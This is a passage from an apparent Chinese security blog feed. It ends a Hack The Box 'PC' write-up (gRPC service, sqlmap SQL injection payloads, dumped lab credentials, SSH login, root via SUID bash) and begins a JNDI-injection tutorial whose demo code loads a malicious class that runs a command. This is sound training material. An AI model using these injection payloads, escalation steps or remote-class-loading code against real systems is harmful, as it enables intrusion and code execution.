function">find</span> at least 1 <span class="token function">open</span> and 1 closed portDevice type: general purpose<span class="token operator">|</span>specializedRunning <span class="token punctuation">(</span>JUST GUESSING<span class="token punctuation">)</span>: Linux 5.X<span class="token operator">|</span>4.X<span class="token operator">|</span>2.6.X <span class="token punctuation">(</span>98%<span class="token punctuation">)</span>, Crestron 2-Series <span class="token punctuation">(</span>90%<span class="token punctuation">)</span>OS CPE: cpe:/o:linux:linux_kernel:5.0 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:crestron:2_seriesAggressive OS guesses: Linux 5.0 <span class="token punctuation">(</span>98%<span class="token punctuation">)</span>, Linux 4.15 - 5.6 <span class="token punctuation">(</span>92%<span class="token punctuation">)</span>, Linux 5.0 - 5.4 <span class="token punctuation">(</span>91%<span class="token punctuation">)</span>, Linux 5.3 - 5.4 <span class="token punctuation">(</span>91%<span class="token punctuation">)</span>, Linux 2.6.32 <span class="token punctuation">(</span>91%<span class="token punctuation">)</span>, Linux 5.0 - 5.3 <span class="token punctuation">(</span>90%<span class="token punctuation">)</span>, Linux 5.4 <span class="token punctuation">(</span>90%<span class="token punctuation">)</span>, Crestron XPanel control system <span class="token punctuation">(</span>90%<span class="token punctuation">)</span>No exact OS matches <span class="token keyword">for</span> host <span class="token punctuation">(</span>test conditions non-ideal<span class="token punctuation">)</span>.Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernelOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token keyword">.</span>Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 35.90 seconds</code></pre><p>不知道这个50051是什么我们用nc连接看一下回显:</p><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>└─$ nc 10.10.11.214 50051▒?��?�� ?</code></pre><p>上网搜搜看，发现github说GRPC模板的默认端口就是50051</p><p>​<img src="/Blogimages/HTB_PC/image-20230529151112-ajzm71u.png" alt="image">​</p><p>看看什么是GRPC：</p><p>gRPC is a modern open source high performance Remote Procedure Call (RPC) framework that can run in any environment. It can efficiently connect services in and across data centers with pluggable support for load balancing, tracing, health checking and authentication. It is also applicable in last mile of distributed computing to connect devices, mobile applications and browsers to backend services.</p><p>Google远程过程调用（Google Remote Procedure Call，gRPC）是基于HTTP 2.0传输层协议承载的高性能开源RPC软件框架，为管理和配置网络设备提供了一种API接口设计的方法。gRPC提供了多种编程语言，如C、Java、golong、python等。<br>gRPC可以作为数据传输协议与<a href="https://info.support.huawei.com/info-finder/encyclopedia/zh/Telemetry.html" title="Telemetry">Telemetry</a>技术配合使用，可实时、高速、精确的监控网络设备的运行状态。此外，网络设备提供了一种基于gRPC方式来管理设备的方法，包括配置、查询和能力获取三种方法。这些方法是通过设备和采集器对接，实现采集设备数据的功能。</p><p>​<img src="/Blogimages/HTB_PC/image-20230529151548-7efqy9j.png" alt="image">​</p><p>感觉就是服务端和客户端通信嘛，有一个工具叫<code>gRPC UI</code>​把交互的过程使用web页面的形式来完成，更方便快捷。</p><h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>安装这个工具：</p><pre class=" language-bash"><code class="language-bash">go <span class="token function">install</span> github.com/fullstorydev/grpcui/cmd/grpcui@latest</code></pre><p>这个工具会被安装在~&#x2F;go&#x2F;bin目录下</p><p>使用命令连接pc的50051端口</p><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/go/bin<span class="token punctuation">]</span>└─$ ./grpcui -plaintext pc:50051gRPC Web UI available at http://127.0.0.1:46567/ATTENTION: default value of option mesa_glthread overridden by environment.<span class="token punctuation">[</span>GFX1-<span class="token punctuation">]</span>: Unrecognized feature ACCELERATED_CANVAS2DMissing chrome or resource URL: resource://gre/modules/UpdateListener.jsmMissing chrome or resource URL: resource://gre/modules/UpdateListener.sys.mjs</code></pre><p>访问端口后发现有很多功能点：</p><p>​<img src="/Blogimages/HTB_PC/image-20230529161549-z0q74up.png" alt="image">​</p><p>我们没有账号尝试一下弱口令<code>admin:admin</code>​</p><p>发现可以登陆成功：</p><p>​<img src="/Blogimages/HTB_PC/image-20230529161645-51085dg.png" alt="image">​</p><p>这里还给了token和id，token看着很像JWT：</p><p>​<img src="/Blogimages/HTB_PC/image-20230529161733-y8abuwx.png" alt="image">​</p><p>登陆了admin，但是不知道下一步要做什么</p><p>这里只是登陆了admin没有其他啥功能点了，我们用burp看看info：</p><p>​<img src="/Blogimages/HTB_PC/image-20230529162613-1zsehon.png" alt="image">​</p><p>对id这个点做sql注入测试：</p><p>​<img src="/Blogimages/HTB_PC/image-20230529162557-78hjpzb.png" alt="image">​</p><p>可能存在，保存数据包，用sqlmap跑跑看：</p><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/HTB/PC<span class="token punctuation">]</span>└─$ <span class="token function">sudo</span> sqlmap -r 1.data --batch<span class="token punctuation">..</span>.<span class="token punctuation">..</span>.sqlmap resumed the following injection point<span class="token punctuation">(</span>s<span class="token punctuation">)</span> from stored session:---Parameter: JSON <span class="token comment" spellcheck="true">#1* ((custom) POST)</span>    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: <span class="token punctuation">{</span><span class="token string">"metadata"</span>:<span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"name"</span><span class="token keyword">:</span><span class="token string">"token"</span>,<span class="token string">"value"</span><span class="token keyword">:</span><span class="token string">"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODUzNTk3MjZ9.HBS0NOvcbvVwZM6FmHgq2r7wZbnvX7gW40dhhu51C1A"</span><span class="token punctuation">}</span><span class="token punctuation">]</span>,<span class="token string">"data"</span>:<span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"id"</span><span class="token keyword">:</span><span class="token string">"573 AND 3475=3475"</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span>    Type: time-based blind    Title: SQLite <span class="token operator">></span> 2.0 AND time-based blind <span class="token punctuation">(</span>heavy query<span class="token punctuation">)</span>    Payload: <span class="token punctuation">{</span><span class="token string">"metadata"</span>:<span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"name"</span><span class="token keyword">:</span><span class="token string">"token"</span>,<span class="token string">"value"</span><span class="token keyword">:</span><span class="token string">"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODUzNTk3MjZ9.HBS0NOvcbvVwZM6FmHgq2r7wZbnvX7gW40dhhu51C1A"</span><span class="token punctuation">}</span><span class="token punctuation">]</span>,<span class="token string">"data"</span>:<span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"id"</span><span class="token keyword">:</span><span class="token string">"573 AND 7652=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))"</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span>    Type: UNION query    Title: Generic UNION query <span class="token punctuation">(</span>NULL<span class="token punctuation">)</span> - 3 columns    Payload: <span class="token punctuation">{</span><span class="token string">"metadata"</span>:<span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"name"</span><span class="token keyword">:</span><span class="token string">"token"</span>,<span class="token string">"value"</span><span class="token keyword">:</span><span class="token string">"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODUzNTk3MjZ9.HBS0NOvcbvVwZM6FmHgq2r7wZbnvX7gW40dhhu51C1A"</span><span class="token punctuation">}</span><span class="token punctuation">]</span>,<span class="token string">"data"</span>:<span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"id"</span><span class="token keyword">:</span><span class="token string">"-5514 UNION ALL SELECT CHAR(113,122,120,112,113)||CHAR(102,105,82,81,100,65,112,80,67,90,106,104,111,71,86,83,117,112,122,76,113,107,98,75,103,118,74,115,69,116,82,109,76,102,88,115,65,79,100,83)||CHAR(113,107,120,122,113)-- wjne"</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span>---<span class="token punctuation">[</span>16:44:04<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> the back-end DBMS is SQLiteback-end DBMS: SQLite<span class="token punctuation">[</span>16:44:04<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> fetched data logged to text files under <span class="token string">'/root/.local/share/sqlmap/output/127.0.0.1'</span>                                              <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ending @ 16:44:04 /2023-05-29/</code></pre><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/HTB/PC<span class="token punctuation">]</span>└─$ <span class="token function">sudo</span> sqlmap -r 1.data --batch --dump<span class="token punctuation">..</span>.<span class="token punctuation">..</span>.Database: <span class="token operator">&lt;</span>current<span class="token operator">></span>Table: accounts<span class="token punctuation">[</span>2 entries<span class="token punctuation">]</span>+------------------------+----------+<span class="token operator">|</span> password               <span class="token operator">|</span> username <span class="token operator">|</span>+------------------------+----------+<span class="token operator">|</span> admin                  <span class="token operator">|</span> admin    <span class="token operator">|</span><span class="token operator">|</span> HereIsYourPassWord1431 <span class="token operator">|</span> sau      <span class="token operator">|</span>+------------------------+----------+<span class="token punctuation">[</span>16:43:18<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> table <span class="token string">'SQLite_masterdb.accounts'</span> dumped to CSV <span class="token function">file</span> <span class="token string">'/root/.local/share/sqlmap/output/127.0.0.1/dump/SQLite_masterdb/accounts.csv'</span>  <span class="token punctuation">[</span>16:43:18<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> fetching columns <span class="token keyword">for</span> table <span class="token string">'messages'</span> <span class="token punctuation">[</span>16:43:18<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> fetching entries <span class="token keyword">for</span> table <span class="token string">'messages'</span>Database: <span class="token operator">&lt;</span>current<span class="token operator">></span>Table: messages<span class="token punctuation">[</span>1 entry<span class="token punctuation">]</span>+-----+-------------------+----------+<span class="token operator">|</span> <span class="token function">id</span>  <span class="token operator">|</span> message           <span class="token operator">|</span> username <span class="token operator">|</span>+-----+-------------------+----------+<span class="token operator">|</span> 573 <span class="token operator">|</span> Will update soon. <span class="token operator">|</span> admin    <span class="token operator">|</span>+-----+-------------------+----------+<span class="token punctuation">[</span>16:43:18<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> table <span class="token string">'SQLite_masterdb.messages'</span> dumped to CSV <span class="token function">file</span> <span class="token string">'/root/.local/share/sqlmap/output/127.0.0.1/dump/SQLite_masterdb/messages.csv'</span>  <span class="token punctuation">[</span>16:43:18<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> fetched data logged to text files under <span class="token string">'/root/.local/share/sqlmap/output/127.0.0.1'</span>                                            <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ending @ 16:43:18 /2023-05-29/</code></pre><p>成功拿到一个用户的密码，我们刚才已经知道了，登陆没啥功能点，所以这个密码可能是ssh的密码：</p><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/HTB/PC<span class="token punctuation">]</span>└─$ <span class="token function">ssh</span> sau@pc                      The authenticity of host <span class="token string">'pc (10.10.11.214)'</span> can<span class="token string">'t be established.ED25519 key fingerprint is SHA256:63yHg6metJY5dfzHxDVLi4Zpucku6SuRziVLenmSmZg.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '</span>pc<span class="token string">' (ED25519) to the list of known hosts.sau@pc'</span>s password: Last login: Mon May 29 08:06:25 2023 from 10.10.14.31-bash-5.0$</code></pre><p>成功登陆</p><p>‍</p><p>拿到第一个flag：</p><pre class=" language-bash"><code class="language-bash">-bash-5.0$ <span class="token function">ls</span> -al /home/sautotal 36drwxr-xr-x 5 sau  sau  4096 May 29 07:07 <span class="token keyword">.</span>drwxr-xr-x 3 root root 4096 Jan 11 18:10 <span class="token punctuation">..</span>lrwxrwxrwx 1 root root    9 Jan 11 18:08 .bash_history -<span class="token operator">></span> /dev/null-rw-r--r-- 1 sau  sau   220 Feb 25  2020 .bash_logout-rw-r--r-- 1 sau  sau  3771 Feb 25  2020 .bashrcdrwx------ 2 sau  sau  4096 Jan 11 17:43 .cachedrwx------ 3 sau  sau  4096 May 29 07:07 .gnupg-rw-r--r-- 1 sau  sau   807 Feb 25  2020 .profilelrwxrwxrwx 1 root root    9 Jan 11 18:09 .viminfo -<span class="token operator">></span> /dev/nulldrwx------ 3 sau  sau  4096 May 29 07:06 snap-rw-r----- 1 root sau    33 May 29 06:07 user.txt-bash-5.0$ <span class="token function">cat</span> /home/sau/user.txt6070551c731exxxxxxxxxxxxxxx</code></pre><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>发现权限不是root，尝试<code>sudo -l</code>​提权未遂</p><p>看看suid提权：</p><pre class=" language-bash"><code class="language-bash">-bash-5.0$ <span class="token function">find</span> / -perm -u<span class="token operator">=</span>s -type f 2<span class="token operator">></span>/dev/null/snap/snapd/17950/usr/lib/snapd/snap-confine/snap/core20/1778/usr/bin/chfn/snap/core20/1778/usr/bin/chsh/snap/core20/1778/usr/bin/gpasswd/snap/core20/1778/usr/bin/mount/snap/core20/1778/usr/bin/newgrp/snap/core20/1778/usr/bin/passwd/snap/core20/1778/usr/bin/su/snap/core20/1778/usr/bin/sudo/snap/core20/1778/usr/bin/umount/snap/core20/1778/usr/lib/dbus-1.0/dbus-daemon-launch-helper/snap/core20/1778/usr/lib/openssh/ssh-keysign/usr/lib/policykit-1/polkit-agent-helper-1/usr/lib/openssh/ssh-keysign/usr/lib/eject/dmcrypt-get-device/usr/lib/snapd/snap-confine/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/bin/at/usr/bin/su/usr/bin/passwd/usr/bin/chfn/usr/bin/fusermount/usr/bin/newgrp/usr/bin/bash/usr/bin/mount/usr/bin/chsh/usr/bin/sudo/usr/bin/umount/usr/bin/gpasswd</code></pre><p>发现有一个<code>/usr/bin/bash</code>​</p><pre class=" language-bash"><code class="language-bash">bash-5.0<span class="token comment" spellcheck="true"># /usr/bin/bash -p</span>bash-5.0<span class="token comment" spellcheck="true"># whoami</span>root</code></pre><p>拿到第二个flag：</p><pre class=" language-bash"><code class="language-bash">bash-5.0<span class="token comment" spellcheck="true"># cd /root</span>bash-5.0<span class="token comment" spellcheck="true"># ls -al</span>total 68drwx------  7 root root  4096 Apr 27 15:32 <span class="token keyword">.</span>drwxr-xr-x 21 root root  4096 Apr 27 15:23 <span class="token punctuation">..</span>lrwxrwxrwx  1 root root     9 Jan 11 17:36 .bash_history -<span class="token operator">></span> /dev/null-rw-r--r--  1 root root  3106 Dec  5  2019 .bashrcdrwxr-xr-x  3 root root  4096 Apr  4 10:25 .cachedrwxr-xr-x  3 root root  4096 Apr  4 10:25 .local-rw-r--r--  1 root root   161 Dec  5  2019 .profiledrwxr-xr-x  7 root root  4096 Jan 11 17:21 .pyload-rw-------  1 root root  3203 Apr 27 15:32 .viminfodrwxr-xr-x  3 root root  4096 Apr 27 13:15 Downloads-rw-r-----  1 root root    33 May 29 06:07 root.txtdrwx------  3 root root  4096 Jan 11 16:56 snap-rw-r--r--  1 root root 24576 Jan 11 17:57 sqlite.db.bakbash-5.0<span class="token comment" spellcheck="true"># cat root.txt</span>9cb7a58bd6a26f8bxxxxxxxxxxxx</code></pre>]]></content>
      
      
      <categories>
          
          <category> 靶机 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JNDI注入</title>
      <link href="/2023/05/09/JNDI%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/05/09/JNDI%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是JNDI"><a href="#什么是JNDI" class="headerlink" title="什么是JNDI"></a>什么是JNDI</h2><p>Java命名目录接口(Java Naming and Directory Interface)，作用是为JAVA应用程序提供命名和目录访问服务的API(application programming interface)。</p><p>可绑定的对象有哪些：</p><pre class=" language-xml"><code class="language-xml">* 轻量级目录访问协议 （LDAP）* 通用对象请求代理体系结构 （CORBA） 通用对象服务 （COS） 名称服务* Java 远程方法调用 （RMI） 注册表* 域名服务 （DNS）</code></pre><p>前三种都是支持一种字符串就绑定一种对象</p><pre class=" language-xml"><code class="language-xml">注：这里JDNI注入就可以用到我们之前的RMI的知识了。之前一直不知道学了RMI有什么用，一直想着怎么利用RMI造成攻击来着，今天总算清楚点了，原来RMI是一个功能，并不是一个漏洞，他不能自己造成攻击，他需要配合其他的东西来造成攻击。</code></pre><p>先来回顾一下RMI的简单流程：</p><p>起一个JNDIServer:</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>example<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>InitialContext<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>LocateRegistry<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JNDIServer</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>        LocateRegistry<span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        InitialContext initialContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        initialContext<span class="token punctuation">.</span><span class="token function">rebind</span><span class="token punctuation">(</span><span class="token string">"rmi://localhost:1099/remoteObj"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">RemoteObjImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><pre class=" language-xml"><code class="language-xml">代码逻辑：1.创建注册中心2.创建上下文容器3.容器绑定服务</code></pre><p>运行Client：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>example<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>InitialContext<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteException<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMIClient</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">,</span> RemoteException <span class="token punctuation">{</span>        InitialContext initialContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        IRemoteObj remoteObj <span class="token operator">=</span> <span class="token punctuation">(</span>IRemoteObj<span class="token punctuation">)</span> initialContext<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"rmi://localhost:1099/remoteObj"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>remoteObj<span class="token punctuation">.</span><span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>如此就完成了最简单的Server端与Client端交互</p><p>现在假设这样一个场景：</p><p>在Client端允许我们控制​<code>rmi://localhost:1099/remoteObj</code>​，即<code>lookup(Path)</code>​的<code>Path</code>​。就可以使用一个恶意服务来使得客户端允许恶意代码造成代码执行，这就是所谓的JNDI注入。</p><p>根据官方文档：</p><p>​​<img src="/Blogimages/JNDI%E6%B3%A8%E5%85%A5/1.png">​​<br>我们可以得到可以绑定的对象有：</p><pre class=" language-xml"><code class="language-xml">1.Java可序列化对象2.可引用对象和JNDI引用3.具有属性的对象(DirContext)4.RMI对象5.CORBA对象在上述示例中我们绑定的是RMI对象，但是通常我们所说的JNDI注入一般是绑定 引用对象 所造成的攻击首先介绍一下 这个引用对象​`Reference类`​的构造函数：</code></pre><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token function">Reference</span><span class="token punctuation">(</span>String className<span class="token punctuation">,</span> RefAddr addr<span class="token punctuation">,</span>                     String factory<span class="token punctuation">,</span> String factoryLocation<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">(</span>className<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">;</span>        classFactory <span class="token operator">=</span> factory<span class="token punctuation">;</span>        classFactoryLocation <span class="token operator">=</span> factoryLocation<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><pre class=" language-xml"><code class="language-xml">className 类名factory 工厂名factoryLocation工厂路径</code></pre><p>这个工厂就是具体的代码逻辑，允许代码执行，但是忽略了恶意代码执行,因此存在注入攻击</p><h2 id="演示代码"><a href="#演示代码" class="headerlink" title="演示代码"></a>演示代码</h2><p>JNDIServer：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>example<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>InitialContext<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>Reference<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>LocateRegistry<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JNDIServer</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>        LocateRegistry<span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        InitialContext initialContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//        initialContext.rebind("rmi://localhost:1099/remoteObj", new RemoteObjImpl());</span>        Reference reference <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Reference</span><span class="token punctuation">(</span><span class="token string">"TestRef"</span><span class="token punctuation">,</span> <span class="token string">"TestRef"</span><span class="token punctuation">,</span> <span class="token string">"http://localhost:9999/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        initialContext<span class="token punctuation">.</span><span class="token function">rebind</span><span class="token punctuation">(</span><span class="token string">"rmi://localhost:1099/remoteObj"</span><span class="token punctuation">,</span> reference<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>注意​<code>initialContext.rebind(&quot;rmi://localhost:1099/remoteObj&quot;, reference);</code>​中是绑定到RMI服务上面，不是使用http协议</p><p>JNDIClient:</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>example<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>InitialContext<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteException<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMIClient</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">,</span> RemoteException <span class="token punctuation">{</span>        InitialContext initialContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        IRemoteObj remoteObj <span class="token operator">=</span> <span class="token punctuation">(</span>IRemoteObj<span class="token punctuation">)</span> initialContext<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"rmi://localhost:1099/remoteObj"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>remoteObj<span class="token punctuation">.</span><span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>然后预先编译好一个恶意类：(注意这个要加载的恶意类不能有package之类的，这样子到时候无法执行)</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestRef</span> <span class="token punctuation">{</span>    <span class="token keyword">static</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="演示步骤："><a href="#演示步骤：" class="headerlink" title="演示步骤："></a>演示步骤：</h2><p>1.将编译好的恶意类放在一个目录下，并启动http服务：<br>​<code>python -m http.server 9999</code>​<br>​​<img src="/Blogimages/JNDI%E6%B3%A8%E5%85%A5/2.png">​​<br>2.开启JNDIServer服务<br>3.允许Client<br>效果：<br>​​<img src="/Blogimages/JNDI%E6%B3%A8%E5%85%A5/image-20230420202927-v7nlw3a.png">​​</p><pre class=" language-ps"><code class="language-ps">PS:这里没有报错是因为没有找到remote.sayHello</code></pre><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>如果​<code>Client</code>​端的<code>lookup(Path)</code>​的<code>Path</code>​我们可以控制就可以利用构造恶意引用对象达到恶意攻击<code>Client</code>​端</p><h2 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h2><p>这里的JNDI是怎么执行到这个恶意类的代码的，我们从lookup下个断点跟进去看看</p><p>这里调试可能会没有源码，因为这个问题卡了我半小时多快气死了给师傅们src.zip少走点弯路吧​<a href="https://youngkylin.yuque.com/attachments/yuque/0/2023/zip/28868587/1680439306488-4dabe88d-dd64-4e35-901d-2cb0b88aa3ac.zip">📎src.zip</a></p><p>我们下断点开始调试：<br>​​<img src="/Blogimages/JNDI%E6%B3%A8%E5%85%A5/image-20230420204730-33aypz5.png">​​<br>跟到lookup里面<br>​​<img src="/Blogimages/JNDI%E6%B3%A8%E5%85%A5/image-20230420204814-bpligtv.png">​​<br>再跟到lookup里<br>​​<img src="/Blogimages/JNDI%E6%B3%A8%E5%85%A5/image-20230420204859-syoxrl0.png">​​<br>依旧跟到lookup里<br>​​<img src="/Blogimages/JNDI%E6%B3%A8%E5%85%A5/image-20230420204957-pkip3ht.png">​​<br>到这一步可以看到获取到的是​<code>obj</code>​是<code>ReferenceWrapper_Stub</code>​<br>这很奇怪，按理来说在服务端绑定的是​<code>Reference</code>​，</p><h3 id="客户端查找服务为什么变成了ReferenceWrapper-Stub​"><a href="#客户端查找服务为什么变成了ReferenceWrapper-Stub​" class="headerlink" 